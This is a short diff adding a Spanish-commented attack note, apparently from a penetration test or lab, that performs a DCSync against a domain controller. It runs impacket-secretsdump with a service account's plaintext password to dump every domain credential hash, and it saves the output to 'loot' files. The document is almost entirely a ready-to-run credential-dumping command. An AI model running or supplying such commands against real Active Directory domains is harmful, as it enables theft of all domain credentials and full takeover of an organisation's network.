@@ -1,0 +1,6 @@
+# DCSync con svc_sql (miembro de BUILTIN\Administrators en el DC)
+# Los miembros de Administrators tienen GetChanges + GetChangesAll sobre el dominio.
+impacket-secretsdump 'corp.local/svc_sql:Password123@172.16.202.131' -just-dc
+
+# Salida completa: loot/dcsync-full.txt
+# Hashes NT:      loot/dcsync-ntlm.txt
